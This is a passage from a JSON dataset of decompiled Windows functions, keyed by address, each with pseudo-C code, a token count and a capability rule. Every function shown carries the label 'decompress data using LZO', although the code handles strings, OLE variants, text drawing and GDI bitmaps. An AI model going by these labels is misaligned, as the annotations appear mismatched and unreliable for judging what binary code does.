        "decompiled_code": "\nulong __fastcall fcn.0040e6e8(uint param_1, uchar *param_2)\n\n{\n    uchar *in_EAX;\n    uchar *puVar1;\n    uchar *puVar2;\n    uchar *in_stack_ffffffec;\n    uchar **ppuVar3;\n    uchar *apuStack16 [2];\n    \n    ppuVar3 = apuStack16;\n    apuStack16[0] = NULL;\n    puVar1 = apuStack16[0];\n    if (0 < param_2) {\n        puVar1 = in_EAX;\n        if (in_EAX != NULL) {\n            puVar1 = *(in_EAX + -4);\n        }\n        if ((puVar1 < param_2) && (param_2 = in_EAX,  in_EAX != NULL)) {\n            param_2 = *(in_EAX + -4);\n        }\n        puVar1 = param_2;\n        if (*0x4988d4 != '\\0') {\n            fcn.0040e5d4(apuStack16);\n            puVar2 = in_EAX;\n            if (in_EAX != NULL) {\n                puVar2 = *(in_EAX + -4);\n            }\n            in_stack_ffffffec = ppuVar3;\n            puVar1 = apuStack16[0];\n            if ((puVar2 < ppuVar3) && (in_stack_ffffffec = in_EAX,  in_EAX != NULL)) {\n                in_stack_ffffffec = *(in_EAX + -4);\n            }\n        }\n    }\n    apuStack16[0] = puVar1;\n    return CONCAT44(apuStack16[0], in_stack_ffffffec);\n}\n",
        "token_count": 376
    },
    "0040e7f0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e7f0(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    \n    if (param_2 < 1) {\n        bVar3 = false;\n    }\n    else {\n        iVar1 = in_EAX;\n        if (in_EAX != 0) {\n            iVar1 = *(in_EAX + -4);\n        }\n        bVar3 = param_2 <= iVar1;\n    }\n    if (bVar3) {\n        bVar3 = *(in_EAX + -1 + param_2) == '\\\\';\n    }\n    else {\n        bVar3 = false;\n    }\n    if (bVar3) {\n        uVar2 = fcn.0040e50c();\n        return uVar2 & 0xffffff00 | uVar2 == '\\0';\n    }\n    return 0;\n}\n",
        "token_count": 218
    },
    "0040e838": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e838(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.00405584(param_1);\n    cVar1 = fcn.0040e7f0();\n    if (cVar1 == '\\0') {\n        fcn.00405818();\n    }\n    return;\n}\n",
        "token_count": 75
    },
    "0040e884": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040e884(uint param_1)\n\n{\n    char cVar1;\n    \n    fcn.00405584(param_1);\n    cVar1 = fcn.0040e7f0();\n    if (cVar1 != '\\0') {\n        fcn.00405c6c();\n    }\n    return;\n}\n",
        "token_count": 77
    },
    "0040e90c": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.0040e90c(uint param_1, int32_t *param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    \n    if (*0x4988d4 == '\\0') {\n        uVar4 = fcn.00409ae8();\n    }\n    else {\n        iVar3 = in_EAX;\n        if (in_EAX != 0) {\n            iVar3 = *(in_EAX + -4);\n        }\n        uVar4 = fcn.00405c6c();\n        iVar6 = 1;\n        if (0 < iVar3) {\n            do {\n                iVar5 = fcn.00405a3c();\n                *(iVar5 + -1 + iVar6) = *(in_EAX + -1 + iVar6);\n                uVar4 = *(in_EAX + -1 + iVar6);\n                if ((*((uVar4 >> 3) + 0x492828) >> (uVar4 & 7) & 1) == 0) {\n                    cVar2 = *(*param_2 + -1 + iVar6);\n                    uVar4 = cVar2 + 0xa5;\n                    if (cVar2 + 0xbfU < 0x1a) {\n                        uVar4 = fcn.00405a3c();\n                        pcVar1 = (uVar4 - 1) + iVar6;\n                        *pcVar1 = *pcVar1 + ' ';\n                    }\n                }\n                else {\n                    iVar6 = iVar6 + 1;\n                    uVar4 = fcn.00405a3c();\n                    *((uVar4 - 1) + iVar6) = *(in_EAX + -1 + iVar6);\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 <= iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 447
    },
    "00411660": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411660(int32_t arg_8h, uint16_t *arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint pvarg;\n    uint *var_8h;\n    int32_t *var_4h;\n    \n    if (*arg_ch == 0x400c) {\n        fcn.00411660(arg_8h, *(arg_ch + 4), arg_10h, arg_14h);\n        return;\n    }\n    if (arg_8h == 0) {\n        var_8h = NULL;\n    }\n    else {\n        sub.oleaut32.dll_VariantInit();\n        var_8h = &pvarg;\n    }\n    uVar3 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uVar1 = *arg_ch;\n    if (uVar1 < 0x102) {\n        if ((uVar1 == 0x101) || ((uVar1 == 9 || (uVar1 == 0xd)))) {\ncode_r0x004116e0:\n            if (*0x49a97c != NULL) {\n                (**0x49a97c)(var_8h, arg_ch, arg_10h, &arg_14h);\n            }\n            goto code_r0x0041172b;\n        }\n    }\n    else if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) goto code_r0x004116e0;\n    cVar2 = fcn.00416180();\n    if (cVar2 == '\\0') {\n        fcn.00410efc();\n    }\n    else {\n        (**(*var_4h + 0x10))(&arg_14h, arg_10h);\n    }\ncode_r0x0041172b:\n    *in_FS_OFFSET = uVar3;\n    if (var_8h != NULL) {\n        fcn.00411a70();\n        fcn.00411644();\n    }\n    return;\n}\n",
        "token_count": 478
    },
    "00415738": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415738(uint param_1, uint16_t *param_2)\n\n{\n    uint16_t uVar1;\n    char cVar2;\n    \n    uVar1 = *param_2;\n    if (uVar1 < 0xe) {\n        if (uVar1 != 0xd) {\n            if (uVar1 == 0) {\n                fcn.0040700c();\n                return;\n            }\n            if (uVar1 == 1) {\n                if (*0x492a5c != '\\0') {\n                    fcn.00410e60();\n                }\n                fcn.0040700c();\n                return;\n            }\n            if (uVar1 != 9) goto code_r0x004157b9;\n        }\n        fcn.00407024();\n    }\n    else {\n        if (uVar1 == 0x101) {\n            fcn.004156c0(param_1);\n            return;\n        }\n        if ((uVar1 == 0x4009) || (uVar1 == 0x400d)) {\n            fcn.00407024();\n            return;\n        }\ncode_r0x004157b9:\n        cVar2 = fcn.00416180();\n        if (cVar2 != '\\0') {\n            fcn.0040700c();\n            cVar2 = fcn.00404704();\n            if (cVar2 != '\\0') {\n                return;\n            }\n        }\n        fcn.00410e60();\n    }\n    return;\n}\n",
        "token_count": 338
    },
    "004166ec": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.004166ec(void)\n\n{\n    char cVar1;\n    char *in_EAX;\n    int32_t *in_FS_OFFSET;\n    uint *puStack36;\n    int32_t iStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = &stack0xfffffffc;\n    var_4h = 0;\n    uStack28 = 0x41677b;\n    iStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe0;\n    fcn.004164f0();\n    cVar1 = *in_EAX;\n    if (cVar1 == '\\x01') {\n        puStack36 = 0x416728;\n        fcn.00409ee4();\n    }\n    else if ((cVar1 == '\\x02') || (cVar1 == '\\t')) {\n        puStack36 = &fcn.004166ec::var_4h;\n        fcn.00405a44();\n        fcn.00409ee4();\n    }\n    else {\n        puStack36 = 0x416763;\n        fcn.00416548();\n    }\n    *in_FS_OFFSET = puStack36;\n    uStack28 = 0x416782;\n    iStack32 = 0x41677a;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 305
    },
    "0041a680": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041a743)\n// WARNING: Removing unreachable block (ram,0x0041a6ed)\n// WARNING: Removing unreachable block (ram,0x0041a6f9)\n// WARNING: Removing unreachable block (ram,0x0041a765)\n// WARNING: Removing unreachable block (ram,0x0041a74e)\n// WARNING: Removing unreachable block (ram,0x0041a770)\n\nvoid fcn.0041a680(void)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack56 = &stack0xfffffffc;\n    uStack60 = 0x41a7a9;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    iVar1 = (**(*in_EAX + 0x14))();\n    fcn.0041af7c();\n    iVar2 = iVar1;\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405620();\n    if (-1 < iVar1 + -1) {\n        do {\n            (**(*in_EAX + 0xc))();\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    *in_FS_OFFSET = uStack64;\n    puStack56 = 0x41a7b0;\n    uStack60 = 0x41a79b;\n    fcn.00405530();\n    uStack60 = 0x41a7a8;\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 488
    },
    "0041ac68": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ac92)\n\nvoid fcn.0041ac68(void)\n\n{\n    int32_t *in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x41acb9;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    (**(*in_EAX + 0x1c))();\n    fcn.0041b994();\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x41acc0;\n    uStack24 = 0x41acb8;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 186
    },
    "0041ad50": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041ae36)\n\nvoid __fastcall fcn.0041ad50(uint param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    code *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack52 = &stack0xfffffffc;\n    uStack56 = 0x41aed9;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack64 = 0x41ad82;\n    fcn.0041a328();\n    uStack68 = 0x41aea7;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &stack0xfffffffc;\n    (**(*in_EAX + 0x44))();\n    if (param_2 != NULL) {\n        fcn.0041af7c();\n        iVar2 = fcn.004098f4();\n        if (iVar2 == 0) {\n            while (*param_2 != '\\0') {\n                for (; ((cVar1 = *param_2,  cVar1 != '\\0' && (cVar1 != '\\n')) && (cVar1 != '\\r')); param_2 = param_2 + 1\n                    ) {\n                }\n                fcn.00405620();\n                (**(*in_EAX + 0x38))();\n                if (*param_2 == '\\r') {\n                    param_2 = param_2 + 1;\n                }\n                if (*param_2 == '\\n') {\n                    param_2 = param_2 + 1;\n                }\n            }\n        }\n        else {\n            if (*(*0x495d2c + 0xc) == '\\0') {\n                var_10h = fcn.0040aa5c;\n            }\n            else {\n                var_10h = fcn.0040e9a0;\n            }\n            fcn.0041af7c();\n            while (*param_2 != '\\0') {\n                fcn.0041af7c();\n                fcn.004059dc();\n                pcVar3 = (*var_10h)();\n                for (; (*param_2 != '\\0' && (pcVar3 != param_2)); param_2 = param_2 + 1) {\n                }\n                fcn.00405620();\n                (**(*in_EAX + 0x38))();\n            }\n        }\n    }\n    *in_FS_OFFSET = uStack72;\n    puStack64 = 0x41aeae;\n    uStack68 = 0x41aea6;\n    fcn.0041a3e4();\n    return;\n}\n",
        "token_count": 700
    },
    "0041c144": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid fcn.0041c144(void)\n\n{\n    int32_t *in_EAX;\n    \n    fcn.004059dc();\n    (**(*in_EAX + 0x10))();\n    return;\n}\n",
        "token_count": 47
    },
    "0041d0a0": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041d0c7)\n// WARNING: Removing unreachable block (ram,0x0041d0cf)\n\nvoid fcn.0041d0a0(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    puStack16 = &stack0xfffffffc;\n    uStack20 = 0x41d0f0;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    fcn.0041e9cc();\n    *in_FS_OFFSET = uStack24;\n    puStack16 = 0x41d0f7;\n    uStack20 = 0x41d0ef;\n    fcn.00405530();\n    return;\n}\n",
        "token_count": 190
    },
    "0041de08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0041de5d)\n\nvoid __fastcall fcn.0041de08(uint param_1, int32_t *param_2)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint *puVar2;\n    int32_t iVar3;\n    int32_t *in_FS_OFFSET;\n    int32_t iStack76;\n    uint uStack72;\n    uchar *puStack68;\n    int32_t iStack64;\n    uint uStack60;\n    uchar *puStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uchar *puStack44;\n    int32_t *var_18h;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack44 = &stack0xfffffffc;\n    puStack56 = &stack0xfffffffc;\n    uStack48 = 0x41e050;\n    iStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    uStack60 = 0x41e002;\n    iStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack68 = 0x41de43;\n    fcn.0041e990();\n    uStack72 = 0x41dfdb;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    iVar3 = 1;\n    *(in_EAX + 0x88) = 1;\n    var_14h = param_2;\n    puStack68 = &stack0xfffffffc;\n    while( true ) {\n        for (; (iVar3 < 1 && (*(iVar3 + -1) != '.')); iVar3 = iVar3 + 1) {\n        }\n        iStack76 = in_EAX + 0x80;\n        fcn.00405a44();\n        if (0 < iVar3) break;\n        fcn.00404890();\n        puVar2 = fcn.004165ac();\n        if (puVar2 == NULL) {\n            fcn.00405584();\n            *(in_EAX + 0x88) = 0;\n            (**(*var_14h + 4))();\n            *(in_EAX + 0x88) = 1;\n            if (*(in_EAX + 0x80) != 0) {\n                fcn.0041cff0();\n            }\n            *in_FS_OFFSET = iStack76;\n            *in_FS_OFFSET = iStack64;\ncode_r0x0041e03a:\n            *in_FS_OFFSET = iStack52;\n            puStack44 = 0x41e057;\n            uStack48 = 0x41e04f;\n            fcn.00405530();\n            return;\n        }\n        var_18h = NULL;\n        if (***puVar2 == '\\a') {\n            var_18h = fcn.0041661c();\n        }\n        cVar1 = fcn.004047dc();\n        if (cVar1 == '\\0') {\n            fcn.0041ddec(&stack0xfffffffc);\n        }\n        var_14h = var_18h;\n        iVar3 = iVar3 + 1;\n    }\n    fcn.00404890();\n    iVar3 = fcn.004165ac();\n    if (iVar3 == 0) {\n        *(in_EAX + 0x88) = 0;\n        (**(*var_14h + 4))();\n        *(in_EAX + 0x88) = 1;\n        if (*(in_EAX + 0x80) != 0) {\n            fcn.0041cff0();\n        }\n    }\n    else {\n        fcn.0041e204();\n    }\n    *in_FS_OFFSET = iStack76;\n    *in_FS_OFFSET = iStack64;\n    goto code_r0x0041e03a;\n}\n",
        "token_count": 872
    },
    "0041f5b4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041f5b4(uint param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    \n    bVar1 = *0x10 == 0x14;\n    fcn.00405974();\n    if (bVar1) {\n        if (param_2 != 0) {\n            param_2 = *(param_2 + -4);\n        }\n        if (param_2 < 0x100) {\n            fcn.0041f6b4();\n            fcn.0041f4b8();\n        }\n        else {\n            fcn.0041f6b4();\n            fcn.0041f4b8();\n        }\n        fcn.0041f4b8();\n    }\n    else {\n        fcn.0041f6b4();\n        fcn.0041f4b8();\n        fcn.0041f4b8();\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00421fb4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421fb4(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 1;\n    fcn.004059dc();\n    fcn.00422134(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 102
    },
    "00421fe4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00421fe4(int32_t param_1)\n\n{\n    uint arg_8h;\n    \n    if (param_1 != 0) {\n        param_1 = *(param_1 + -4);\n    }\n    param_1 = param_1 + 1;\n    arg_8h = 2;\n    fcn.004059dc();\n    fcn.00422134(arg_8h, param_1);\n    return;\n}\n",
        "token_count": 102
    },
    "00425438": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00425438(int32_t arg_8h)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint in_ECX;\n    int32_t in_EDX;\n    uint Y;\n    int32_t X;\n    \n    (**(*in_EAX + 0x10))();\n    fcn.0042579c();\n    cVar1 = fcn.0042540c();\n    X = in_EDX;\n    if (cVar1 == '\\x01') {\n        iVar2 = fcn.0042551c();\n        X = in_EDX + iVar2 + 1;\n    }\n    if (arg_8h != 0) {\n        arg_8h = *(arg_8h + -4);\n    }\n    uVar3 = fcn.004059dc(arg_8h, 0);\n    sub.gdi32.dll_ExtTextOutA(in_EAX[1], X, in_ECX, in_EAX[0x15], 0, uVar3);\n    fcn.0042551c();\n    fcn.004253a4();\n    (**(*in_EAX + 0xc))();\n    return;\n}\n",
        "token_count": 273
    },
    "004254d4": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004254d4(uint *param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    fcn.0042579c();\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (param_2 != 0) {\n        param_2 = *(param_2 + -4);\n    }\n    uVar1 = fcn.004059dc(param_2, param_1);\n    sub.gdi32.dll_GetTextExtentPoint32A(*(in_EAX + 4), uVar1);\n    return;\n}\n",
        "token_count": 142
    },
    "00425c34": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nint32_t fcn.00425c34(void)\n\n{\n    int16_t in_AX;\n    \n    if (((in_AX != 1) && (in_AX != 4)) && (in_AX != 8)) {\n        return 0;\n    }\n    return 1 << (in_AX & 0x1f);\n}\n",
        "token_count": 71
    },
    "00429a48": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\nuint fcn.00429a48(void)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    char cVar3;\n    int32_t in_EAX;\n    uint uVar4;\n    \n    uVar4 = 8;\n    cVar3 = fcn.004299c8();\n    if (cVar3 == '\\x01') {\n        uVar4 = 0;\n    }\n    else {\n        iVar2 = *(in_EAX + 0x28);\n        uVar1 = *(iVar2 + 0x3e);\n        if (uVar1 < 0x11) {\n            if (uVar1 == 0x10) {\n                if (*(iVar2 + 0x40) == 0) {\n                    uVar4 = 4;\n                }\n                else if ((*(iVar2 + 0x40) == 3) && (*(iVar2 + 0x5c) == 0x7e0)) {\n                    uVar4 = 5;\n                }\n            }\n            else if (uVar1 == 1) {\n                uVar4 = 1;\n            }\n            else if (uVar1 == 4) {\n                uVar4 = 2;\n            }\n            else if (uVar1 == 8) {\n                uVar4 = 3;\n            }\n        }\n        else if (uVar1 == 0x18) {\n            uVar4 = 6;\n        }\n        else if ((uVar1 == 0x20) && (*(iVar2 + 0x40) == 0)) {\n            uVar4 = 7;\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 363
    },
    "00429f90": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00429f90(int32_t arg_8h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t *in_EDX;\n    uint32_t uVar4;\n    uint *in_FS_OFFSET;\n    bool bVar5;\n    uint uVar6;\n    uint uStack292;\n    uint uStack288;\n    uchar *puStack284;\n    uint uStack280;\n    uint uStack276;\n    uint uStack272;\n    uint uStack268;\n    uint uStack264;\n    uint uStack260;\n    uchar *puStack256;\n    uint uStack252;\n    int32_t *piStack248;\n    uint uStack244;\n    uint *puStack240;\n    uint uStack236;\n    uchar *puStack232;\n    uint uStack228;\n    uint uStack224;\n    uint uStack212;\n    uint uStack208;\n    uchar *puStack204;\n    uint uStack200;\n    uint uStack196;\n    uchar *puStack192;\n    uint var_aah;\n    uint var_48h;\n    uint var_44h;\n    ushort var_40h;\n    ushort var_3eh;\n    uint var_3ch;\n    uint var_38h;\n    int32_t var_34h;\n    uint hpal;\n    uint hgdiobj;\n    uint var_28h;\n    int32_t var_20h;\n    uint var_1ch;\n    uint lpbmih;\n    int32_t lpbInit;\n    uint var_10h;\n    uint hdc;\n    int32_t *var_8h;\n    uint var_4h;\n    \n    puStack204 = &stack0xfffffffc;\n    puStack192 = 0x429fc3;\n    var_8h = in_EDX;\n    (**(*in_EDX + 0xc))();\n    bVar5 = var_20h == 0xc;\n    if (bVar5) {\n        var_20h = 0x28;\n    }\n    puStack192 = 0x429fe8;\n    piVar1 = fcn.00402f00();\n    uStack196 = 0x42a4b1;\n    uStack200 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff38;\n    uStack208 = 0x42a484;\n    uStack212 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff2c;\n    if (bVar5) {\n        puStack204 = &stack0xfffffffc;\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        fcn.00403af4();\n        piVar1[1] = var_44h;\n        piVar1[2] = var_44h._2_2_;\n        *(piVar1 + 3) = var_40h;\n        *(piVar1 + 0xe) = var_3eh;\n    }\n    else {\n        puStack192 = &stack0xfffffffc;\n        (**(*var_8h + 0xc))();\n        if ((piVar1[4] != 3) && (piVar1[4] != 0)) {\n            var_8h = fcn.00404620();\n            if (arg_8h == 0) {\n                fcn.00403af4();\n            }\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            (**(*var_8h + 0x10))();\n            uStack224 = 0x42a116;\n            fcn.0041b9cc(in_ECX - var_20h, 0);\n            uStack224 = 0x42a126;\n            (**(*var_8h + 0x14))();\n        }\n    }\n    *piVar1 = var_20h;\n    if (*(piVar1 + 3) != 1) {\n        fcn.004259a4();\n    }\n    if ((var_20h == 0x28) && (((*(piVar1 + 0xe) == 0x10 || (*(piVar1 + 0xe) == 0x20)) && (piVar1[4] == 3)))) {\n        fcn.0041b95c();\n    }\n    if (piVar1[8] == 0) {\n        iVar2 = fcn.00425c34();\n        piVar1[8] = iVar2;\n    }\n    fcn.0041b95c();\n    if ((piVar1[5] == 0) || (piVar1[4] == 0)) {\n        iVar2 = fcn.00425c54();\n        uVar4 = piVar1[2] >> 0x1f;\n        piVar1[5] = iVar2 * ((piVar1[2] ^ uVar4) - uVar4);\n    }\n    if (bVar5) {\n        fcn.00425f00();\n    }\n    sub.user32.dll_GetDC();\n    uStack252 = fcn.00425ac4();\n    uStack224 = 0x42a3ff;\n    uStack228 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff1c;\n    hdc = uStack252;\n    if (((piVar1[4] == 0) || (piVar1[4] == 3)) && (*0x492bb8 == '\\0')) {\n        puStack232 = NULL;\n        uStack236 = 0;\n        puStack240 = &fcn.00429f90::lpbInit;\n        uStack244 = 0;\n        puStack256 = 0x42a385;\n        piStack248 = piVar1;\n        iVar2 = sub.gdi32.dll_CreateDIBSection();\n        if ((iVar2 == 0) || (lpbInit == 0)) {\n            puStack256 = 0x42a399;\n            iVar2 = sub.kernel32.dll_GetLastError_1();\n            if (iVar2 == 0) {\n                puStack256 = 0x42a3a2;\n                fcn.004259a4();\n            }\n            else {\n                puStack256 = 0x42a3a9;\n                fcn.0040f274();\n            }\n        }\n        uStack260 = 0x42a3ce;\n        uStack264 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xfffffef8;\n        uStack268 = 0x42a3c4;\n        puStack256 = &stack0xfffffffc;\n        fcn.0041b95c();\n        *in_FS_OFFSET = uStack264;\n        *in_FS_OFFSET = uStack252;\n        uStack244 = 0x42a406;\n        piStack248 = hdc;\n        uStack252 = 0;\n        puStack256 = 0x42a3fe;\n        sub.user32.dll_ReleaseDC();\n        return;\n    }\n    var_10h = 0;\n    puStack232 = 0x42a241;\n    lpbInit = fcn.00402f00();\n    uStack236 = 0x42a367;\n    puStack240 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff10;\n    uStack244 = 0x42a25f;\n    puStack232 = &stack0xfffffffc;\n    fcn.0041b95c();\n    uStack244 = hdc;\n    piStack248 = 0x42a268;\n    sub.gdi32.dll_CreateCompatibleDC();\n    piStack248 = 0x42a26d;\n    var_10h = fcn.00425ac4();\n    piStack248 = 0x1;\n    uStack252 = 1;\n    puStack256 = hdc;\n    uStack260 = 0x42a27d;\n    uStack260 = sub.gdi32.dll_CreateCompatibleBitmap();\n    uStack264 = var_10h;\n    uStack268 = 0x42a287;\n    uVar3 = sub.gdi32.dll_SelectObject();\n    var_34h = 0;\n    if (piVar1[8] != 0) {\n        uStack268 = 0x42a2a5;\n        uStack272 = fcn.004261bc();\n        uStack268 = 0;\n        uStack276 = var_10h;\n        uStack280 = 0x42a2b7;\n        var_34h = sub.gdi32.dll_SelectPalette();\n        uStack280 = var_10h;\n        puStack284 = 0x42a2c3;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack288 = 0x42a33b;\n    uStack292 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffedc;\n    uVar6 = var_10h;\n    puStack284 = &stack0xfffffffc;\n    iVar2 = sub.gdi32.dll_CreateDIBitmap(var_10h, piVar1, 4, lpbInit, piVar1, 0);\n    if (iVar2 == 0) {\n        iVar2 = sub.kernel32.dll_GetLastError_1();\n        if (iVar2 == 0) {\n            fcn.004259a4();\n        }\n        else {\n            fcn.0040f274();\n        }\n    }\n    *in_FS_OFFSET = uVar6;\n    if (var_34h != 0) {\n        sub.gdi32.dll_SelectPalette(var_10h, var_34h, 0xffffffff, 0x42a342);\n    }\n    uVar3 = sub.gdi32.dll_SelectObject(var_10h, uVar3);\n    sub.gdi32.dll_DeleteObject(uVar3);\n    return;\n}\n",
        "token_count": 2178
    },
    "0042bf08": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
